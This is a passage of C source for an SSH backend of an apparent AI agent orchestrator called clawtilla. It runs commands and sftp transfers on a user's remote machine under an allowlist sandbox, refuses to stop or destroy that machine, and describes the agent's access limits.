                        self->host,
                        found == CLAWT_SSH_PROBE_MISSING
                        ? "clawtilla does not create directories on a "
                          "machine it does not own: make it over there, or "
                          "drop required from the mount."
                        : "That is a transport failure rather than a missing "
                          "directory, and it is deliberately not treated as "
                          "absence.");
            clawt_computer_set_state(computer, CLAWT_COMPUTER_STATE_ERROR,
                                     (error != NULL && *error != NULL)
                                     ? (*error)->message : NULL);
            return FALSE;
        }

        g_warning("ssh computer %s: '%s' %s on %s, so it is not in the "
                  "allowlist and commands naming it will be refused",
                  clawt_computer_get_agent_id(computer), target,
                  found == CLAWT_SSH_PROBE_MISSING ? "is not a directory"
                                                   : "could not be checked",
                  self->host);
    }

    clawt_computer_set_state(computer, CLAWT_COMPUTER_STATE_RUNNING, NULL);

    return TRUE;
}

static gboolean
ssh_start(ClawtComputer *computer, GError **error)
{
    return ssh_provision(computer, error);
}

/*
 * Refused by name, rather than left to the base class or answered TRUE.
 *
 * The base class would refuse too, and say "does not know how to stop
 * itself, so whatever it started is still running" -- which is the wrong
 * sentence here, because clawtilla never started anything. This one says
 * what is actually true: the machine is somebody's, it was up before the
 * fleet was, and shutting it down is not a thing an agent orchestrator
 * gets to do. clawt_computer_type_has_machine() is FALSE, so no client
 * offers the verb; this is the second gate for anything that reaches the
 * backend another way.
 */
static gboolean
ssh_stop(ClawtComputer *computer, GError **error)
{
    ClawtSshComputer *self = CLAWT_SSH_COMPUTER(computer);

    g_set_error(error, CLAWT_ERROR, CLAWT_ERROR_NOT_SUPPORTED,
                "an ssh computer has no machine of clawtilla's to stop: '%s' "
                "is a machine you already run, and shutting it down is not "
                "something an agent gets to do. Nothing was changed.",
                self->host != NULL ? self->host : "(unset)");

    return FALSE;
}

static gboolean
ssh_teardown(ClawtComputer *computer, GError **error)
{
    ClawtSshComputer *self = CLAWT_SSH_COMPUTER(computer);

    g_set_error(error, CLAWT_ERROR, CLAWT_ERROR_NOT_SUPPORTED,
                "an ssh computer has nothing of clawtilla's to destroy: '%s' "
                "and everything on it belongs to you. Removing the agent "
                "takes away its access and changes nothing over there.",
                self->host != NULL ? self->host : "(unset)");

    return FALSE;
}

static ClawtExecResult *
ssh_exec(ClawtComputer        *computer,
         const gchar * const  *argv,
         const gchar          *working_dir,
         guint                 timeout_seconds,
         GCancellable         *cancellable,
         GError              **error)
{
    ClawtSshComputer *self = CLAWT_SSH_COMPUTER(computer);
    g_autofree gchar *binary = NULL;
    g_autofree gchar *line = NULL;
    g_autofree gchar *stdout_text = NULL;
    g_autofree gchar *stderr_text = NULL;
    g_autofree gchar *bounded_stdout = NULL;
    g_autofree gchar *bounded_stderr = NULL;
    g_auto(GStrv) command = NULL;
    ClawtExecResult *result;
    const gchar *directory;
    gint exit_status = 0;
    gboolean truncated = FALSE;
    gboolean stderr_truncated = FALSE;

    if (cancellable != NULL && g_cancellable_is_cancelled(cancellable)) {
        g_set_error_literal(error, CLAWT_ERROR, CLAWT_ERROR_CANCELLED,
                            "the command was cancelled before it started");
        return NULL;
    }

    if (!clawt_ssh_host_is_valid(self->host, error))
        return NULL;

    /*
     * Checked before anything is spawned, and through the same
     * ClawtSandbox the host backend uses -- so `sudo`, a shell one-liner
     * hiding one, and a path outside the allowlist are refused by one
     * implementation rather than by two that would drift.
     */
    if (self->sandbox != NULL &&
        !clawt_sandbox_check_argv(self->sandbox, argv, error))
        return NULL;

    directory = (working_dir != NULL && *working_dir != '\0')
                ? working_dir : self->workspace;

    if (self->sandbox != NULL && directory != NULL &&
        !clawt_sandbox_path_is_allowed(self->sandbox, directory)) {
        g_set_error(error, CLAWT_ERROR, CLAWT_ERROR_CONFINEMENT,
                    "'%s' is outside what this agent may reach on %s",
                    directory, self->host);
        return NULL;
    }

    binary = clawt_ssh_resolve_binary("ssh", error);

    if (binary == NULL)
        return NULL;

    line = join_quoted(argv, directory);
    command = build_argv_for_line(self, binary, line);

    if (!run_prepared((const gchar * const *)command, NULL, timeout_seconds,
                      cancellable, &exit_status, &stdout_text, &stderr_text,
                      error))
        return NULL;

    bounded_stdout = clawt_computer_truncate_output(stdout_text,
                                                    CLAWT_COMPUTER_MAX_OUTPUT_BYTES,
                                                    &truncated);
    bounded_stderr = clawt_computer_truncate_output(stderr_text,
                                                    CLAWT_COMPUTER_MAX_OUTPUT_BYTES,
                                                    &stderr_truncated);

    result = clawt_exec_result_new(exit_status, bounded_stdout,
                                   bounded_stderr);
    clawt_exec_result_set_truncated(result, truncated || stderr_truncated);

    return result;
}

/*
 * sftp, not scp.
 *
 * scp's traditional protocol lets the *remote* end decide what files
 * arrive, which is a poor property for a transfer clawtilla makes on an
 * agent's behalf; sftp asks for one named file and gets one named file.
 */
static gboolean
ssh_transfer(ClawtSshComputer *self, const gchar *command,
             const gchar *first, const gchar *second, GError **error)
{
    g_autofree gchar *binary = NULL;
    g_autofree gchar *batch = NULL;
    g_autofree gchar *errors = NULL;
    GPtrArray *argv;
    g_auto(GStrv) full = NULL;
    gint exit_status = 0;

    batch = clawt_ssh_build_sftp_batch(command, first, second);

    if (batch == NULL) {
        g_set_error(error, CLAWT_ERROR, CLAWT_ERROR_INVALID_ARGUMENT,
                    "that path cannot be sent to sftp: its batch language "
                    "quotes with '\"' and has no escape inside quotes, so a "
                    "path containing '\"', '\\' or a newline cannot be "
                    "written unambiguously.");
        return FALSE;
    }

    binary = clawt_ssh_resolve_binary("sftp", error);

    if (binary == NULL)
        return FALSE;

    argv = g_ptr_array_new_with_free_func(g_free);
    g_ptr_array_add(argv, g_strdup(binary));
    append_common_options(self, argv);

    /* The batch script arrives on stdin, so the paths never reach an argv. */
    g_ptr_array_add(argv, g_strdup("-b"));
    g_ptr_array_add(argv, g_strdup("-"));
    g_ptr_array_add(argv, g_strdup("--"));
    g_ptr_array_add(argv, g_strdup(self->host));
    g_ptr_array_add(argv, NULL);

    full = (GStrv)g_ptr_array_free(argv, FALSE);

    if (!run_prepared((const gchar * const *)full, batch,
                      PROBE_TIMEOUT_SECONDS, NULL, &exit_status, NULL,
                      &errors, error))
        return FALSE;

    if (exit_status != 0) {
        g_set_error(error, CLAWT_ERROR, CLAWT_ERROR_FAILED,
                    "sftp could not %s: %s", command,
                    (errors != NULL && *errors != '\0')
                    ? g_strstrip(errors) : "it gave no reason");
        return FALSE;
    }

    return TRUE;
}

static gboolean
ssh_put_file(ClawtComputer *computer, const gchar *local_path,
             const gchar *remote_path, GError **error)
{
    ClawtSshComputer *self = CLAWT_SSH_COMPUTER(computer);

    if (self->sandbox != NULL &&
        !clawt_sandbox_path_is_allowed(self->sandbox, remote_path)) {
        g_set_error(error, CLAWT_ERROR, CLAWT_ERROR_CONFINEMENT,
                    "'%s' is outside what this agent may reach on %s",
                    remote_path, self->host);
        return FALSE;
    }

    return ssh_transfer(self, "put", local_path, remote_path, error);
}

static gboolean
ssh_get_file(ClawtComputer *computer, const gchar *remote_path,
             const gchar *local_path, GError **error)
{
    ClawtSshComputer *self = CLAWT_SSH_COMPUTER(computer);

    if (self->sandbox != NULL &&
        !clawt_sandbox_path_is_allowed(self->sandbox, remote_path)) {
        g_set_error(error, CLAWT_ERROR, CLAWT_ERROR_CONFINEMENT,
                    "'%s' is outside what this agent may reach on %s",
                    remote_path, self->host);
        return FALSE;
    }

    return ssh_transfer(self, "get", remote_path, local_path, error);
}

static gchar *
ssh_describe(ClawtComputer *computer)
{
    ClawtSshComputer *self = CLAWT_SSH_COMPUTER(computer);
    g_autoptr(GString) out = g_string_new(NULL);
    GPtrArray *mounts;
    guint i;

    g_string_append_printf(out,
        "Your computer is %s, another machine reached over ssh. It is not "
        "clawtilla's: it was running before this fleet existed and nothing "
        "here can start it, stop it or take it apart.",
        self->host != NULL ? self->host : "(no host configured)");

    /*
     * The trap that costs the most turns, on this backend more than any
     * other -- because unlike a container there is no visible difference
     * between the two filesystems until something is not where it was
     * put.
     */
    g_string_append(out,
        "\n\nYour own bash, read and write tools run on the machine "
        "clawtilla itself is on, NOT over there. Only "
        "clawtilla_computer_exec crosses the connection. A file you write "
        "with `write` and then look for with clawtilla_computer_exec will "
        "not be there, and neither will the other way round -- these are "
        "two different computers with two different filesystems.");

    g_string_append(out,
        "\n\nclawtilla_computer_exec takes a command and its arguments, not "
        "a shell line: every argument is quoted before it is sent, so '>', "
        "'|', '&&', ';', '*' and '$VAR' arrive as literal text. To use any "
        "of them, run a shell explicitly -- for example sh -c 'a > b'.");

    if (self->workspace != NULL) {
        g_string_append_printf(out,
            "\n\nYou work in %s over there, which is where a command with "
            "no directory of its own runs.", self->workspace);
    }

    if (self->sandbox != NULL) {
        g_autofree gchar *confinement = clawt_sandbox_describe(self->sandbox);

        g_string_append_printf(out, "\n\n%s", confinement);
    }

    /*
     * Listed by name rather than only as a boundary.  An agent told only
     * what it may not reach spends turns discovering what it may -- and
     * on this backend the list is the *whole* grant, since there is no
     * kernel mount behind it.
     */
    mounts = clawt_computer_get_mounts(computer);

    for (i = 0; mounts != NULL && i < mounts->len; i++) {
        ClawtMount *mount = g_ptr_array_index(mounts, i);

        if (i == 0) {
            g_string_append(out,
                "\n\nBesides your workspace you may also reach these "
                "directories on that machine. They are not mounts -- "
                "nothing was copied or shared; they are simply the paths "
                "you are allowed to name:");
        }

        g_string_append_printf(out, "\n  %s%s",
                               clawt_mount_get_target(mount),
                               clawt_mount_get_mode(mount) ==
                               CLAWT_MOUNT_MODE_RO ? " (read only)" : "");
    }

    return g_string_free(g_steal_pointer(&out), FALSE);
}

static ClawtComputerType
ssh_get_computer_type(ClawtComputer *computer)
{
    (void)computer;
    return CLAWT_COMPUTER_SSH;
}

static void
clawt_ssh_computer_dispose(GObject *object)
{
    ClawtSshComputer *self = CLAWT_SSH_COMPUTER(object);

    g_clear_object(&self->sandbox);

    G_OBJECT_CLASS(clawt_ssh_computer_parent_class)->dispose(object);
}

static void
clawt_ssh_computer_finalize(GObject *object)
{
    ClawtSshComputer *self = CLAWT_SSH_COMPUTER(object);

    g_clear_pointer(&self->host, g_free);
    g_clear_pointer(&self->workspace, g_free);
    g_clear_pointer(&self->shell, g_free);
    g_clear_pointer(&self->control_path, g_free);

    G_OBJECT_CLASS(clawt_ssh_computer_parent_class)->finalize(object);
}

static void
clawt_ssh_computer_class_init(ClawtSshComputerClass *klass)
{
    GObjectClass *object_class = G_OBJECT_CLASS(klass);
    ClawtComputerClass *computer_class = CLAWT_COMPUTER_CLASS(klass);

    object_class->dispose = clawt_ssh_computer_dispose;
    object_class->finalize = clawt_ssh_computer_finalize;

    computer_class->provision = ssh_provision;
    computer_class->start = ssh_start;
    computer_class->stop = ssh_stop;
    computer_class->teardown = ssh_teardown;
    computer_class->exec = ssh_exec;
    computer_class->put_file = ssh_put_file;
    computer_class->get_file = ssh_get_file;
    computer_class->describe = ssh_describe;
    computer_class->get_computer_type = ssh_get_computer_type;
}

static void
clawt_ssh_computer_init(ClawtSshComputer *self)
{
    self->connect_timeout = 10;
    self->control_persist = 600;
    self->status = CLAWT_SSH_STATUS_NOT_READY;
}
